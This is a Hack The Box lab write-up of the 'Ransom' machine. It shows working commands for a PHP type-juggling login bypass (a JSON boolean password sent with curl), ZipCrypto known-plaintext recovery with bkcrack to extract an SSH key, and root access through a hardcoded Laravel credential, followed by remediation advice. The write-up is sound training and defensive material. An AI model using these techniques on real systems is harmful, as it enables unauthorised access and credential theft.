---
title: "Ransom — PHP Type Juggling and ZipCrypto Known-Plaintext"
description: "A PHP loose-comparison flaw bypasses authentication; a ZIP archive's ZipCrypto encryption is broken via known-plaintext to recover an SSH key, and a hardcoded credential in Laravel source provides root."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - web
  - php
  - laravel
objective: "Bypass a Laravel login through PHP loose comparison, recover an SSH key from a ZipCrypto archive, and escalate to root."
tools:
  - nmap
  - curl
  - 7z
  - zip
  - bkcrack
  - ssh
skill: "Authentication-logic abuse and cryptographic archive recovery"
outcome: "Authenticated web session, SSH user access from a recovered private key, and confirmed root execution"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Medium |
| Target environment | Linux (Ubuntu 20.04) hosting a Laravel application behind Apache 2.4.41, with OpenSSH 8.2p1 |
| Starting position | Unauthenticated network access |
| Objective | Bypass web authentication, recover credentials from an exposed archive, and escalate to root |
| Outcome | Authenticated web session, user-level SSH access via a recovered private key, and root execution |

## From type juggling to ZipCrypto key recovery

Ransom is a medium-difficulty Hack The Box Linux lab whose Laravel login endpoint accepts a PHP loose-comparison quirk: a JSON boolean `true` in the password field authenticates without the real credential. Behind the login sits a home-directory ZIP archive encrypted with ZipCrypto; because it ships a predictable `.bash_logout`, a known-plaintext attack recovers the encryption keys and exposes an SSH private key for initial access. A credential hardcoded in the Laravel authentication controller then provides root. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).

**Attack path:** **PHP type-juggling login bypass → ZipCrypto known-plaintext key recovery → recovered SSH key → user shell → hardcoded Laravel controller credential → root**

## Ubuntu Laravel host from unauthenticated access

- **Target:** Linux (Ubuntu 20.04) running a Laravel application.
- **Exposed services:** SSH (22, OpenSSH 8.2p1) and HTTP (80, Apache 2.4.41).
- **Starting position:** unauthenticated network access; the web login accepts only a password, with no username field.
- **Objective:** bypass authentication on the web application, recover credentials from the exposed archive, obtain a shell, and escalate to root.
- **Constraints:** I kept activity inside the Hack The Box lab environment.

## Evidence: type-juggling bypass to ZipCrypto recovery

### 1. Service enumeration

Observation: a service-and-version scan exposes two services.

```bash
nmap -sC -sV -oA <OUTPUT_PREFIX> <TARGET_IP>
```

```text
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.41 — Laravel application
```

Significance: SSH is the eventual shell target, while the web service hosts a Laravel application whose login page requires only a password.

Result: the exposed surface is limited to an SSH service and a Laravel web application.

### 2. Login endpoint analysis and type-juggling bypass

Observation: the login endpoint accepts a JSON body carrying a single password field.

Action: I tried a JSON string password, which was rejected, and a JSON boolean `true`, which authenticated.

```bash
curl -s http://<TARGET_IP>/api/login \
  -H "Content-Type: application/json" \
  -d '{"password": true}'
# Login Successful
```

Significance: PHP's loose comparison operator (`==`) treats the boolean `true` as loosely equal to any non-empty string other than `"0"`, so comparing user input to the expected credential with `==` accepts `true`. The request with a string value returned `Invalid Password`.

Result: a session cookie is issued, confirming authenticated access without the real credential.

### 3. Authenticated archive discovery

Observation: the authenticated application exposes a downloadable home-directory archive named `uploaded-file-3422.zip`.

```bash
7z l -slt uploaded-file-3422.zip | grep -i "method\|encrypt"
```

```text
Method = ZipCrypto Deflate
Encrypted = +
```

Significance: ZipCrypto is the original ZIP encryption format and is vulnerable to known-plaintext attacks when at least 12 bytes of a member's plaintext are known; the archive's member list is therefore the next target.

Result: the archive is confirmed to use ZipCrypto Deflate encryption.

### 4. ZipCrypto known-plaintext recovery

Observation: the archive contains `.bash_logout`, whose content on Ubuntu 20.04 is fixed and therefore known.

Action: a reference ZIP with the known member supplies the plaintext for key recovery.

```bash
zip plain.zip .bash_logout

./bkcrack -C uploaded-file-3422.zip \
  -c .bash_logout \
  -P plain.zip \
  -p .bash_logout
# Keys recovered: <KEY_1> <KEY_2> <KEY_3>
```

Significance: the recovered internal keys let `bkcrack` repackage the archive under a chosen password without knowing the original one.

```bash
./bkcrack -C uploaded-file-3422.zip \
  -k <KEY_1> <KEY_2> <KEY_3> \
  -U unlocked.zip <NEW_PASSWORD>

7z x -p<NEW_PASSWORD> unlocked.zip
```

Result: the decrypted archive yields `.ssh/id_rsa` and `.ssh/id_rsa.pub`, and the public key identifies the account name.

### 5. SSH initial access

Observation: the archive exposes an unencrypted SSH private key for the account.

```bash
chmod 600 .ssh/id_rsa
ssh <LAB_USER>@<TARGET_IP> -i .ssh/id_rsa
```

Significance: a private key recovered from the archive authenticates directly to the exposed SSH service.

Result: user-level SSH access as `<LAB_USER>`.

### 6. Privilege escalation: hardcoded credential in controller source

Observation: the shell permits reading of the Laravel application source.

```bash
find /srv/prod -name "*.php" | xargs grep -l "password" 2>/dev/null
cat /srv/prod/app/Http/Controllers/AuthController.php
```

```php
public function customLogin(Request $request) {
    $request->validate(['password' => 'required']);

    if ($request->get('password') == "<HARDCODED_CREDENTIAL>") {
        session(['loggedin' => True]);
        return "Login Successful";
    }
    return "Invalid Password";
}
```

Significance: the credential is hardcoded and compared with the same loose `==` that the login bypass exploited, so reading the source discloses the secret directly.

Action: I used the hardcoded controller-source credential with `su -` to switch to root.

```bash
su -
# Password: <HARDCODED_CREDENTIAL>

id
# uid=0(root) gid=0(root) groups=0(root)
```

Result: the `id` output confirms execution in the root context.

## The known-plaintext requirement in ZipCrypto

| Challenge | Decision | Rationale |
|---|---|---|
| ZipCrypto needs at least 12 bytes of known plaintext | Used the predictable `.bash_logout` shipped inside the archive | Ubuntu 20.04 `.bash_logout` content is fixed and known |

## Outcome: authenticated session, SSH key access, and root

The `id` output confirms root execution after authenticated web access through the PHP type-juggling bypass and recovery of the SSH private key from the ZipCrypto-protected archive. I could not verify the initial SSH login from captured output; it is the only transition recorded without it.

## Recommendations: loose comparison, hardcoded credentials, and ZipCrypto

The findings support the following remediation, but no remediation test is recorded.

1. **Loose comparison in authentication logic.** Root cause: the controller compares user input to a credential string with `==`. Impact: the boolean `true` compares loosely equal to any non-empty string other than `"0"`, so the check is satisfied and authentication is bypassed. Recommendation: use strict comparison (`===`) and Laravel's built-in `Auth::attempt()`, which performs hashed credential checks, and audit authentication code for loose comparisons.
2. **Credential hardcoded in application source.** Root cause: the plaintext credential is embedded in `AuthController`. Impact: any source disclosure yields the credential, and the same value grants root, so a web-application flaw escalates to host compromise. Recommendation: load secrets from environment configuration or a dedicated secrets manager and keep them out of version control.
3. **ZipCrypto-encrypted archive.** Root cause: legacy ZipCrypto encryption is applied to an archive containing a predictable member (`.bash_logout`). Impact: known-plaintext key recovery exposes the contents, including an SSH private key. Recommendation: use modern authenticated archive encryption such as AES-256 and avoid packaging predictable files into sensitive archives.

## References

- [Hack The Box — Ransom](https://app.hackthebox.com/machines/Ransom) (retired machine)
- [PHP — Comparison Operators](https://www.php.net/manual/en/language.operators.comparison.php) (loose `==` versus strict `===` semantics)
- [bkcrack](https://github.com/kimci86/bkcrack) (ZipCrypto known-plaintext key recovery)
- [7-Zip](https://7-zip.org/) (archive listing and extraction)
- [curl — command-line tool and library](https://curl.se/docs/manpage.html) (HTTP requests to the login endpoint)
- [OpenSSH manual pages](https://www.openssh.com/manual.html) (`ssh` and key permissions)
- [Nmap Reference Guide](https://nmap.org/book/man.html) (service and version scanning)
- [Laravel — Authentication](https://laravel.com/docs/authentication) (built-in `Auth` guard and credential handling)
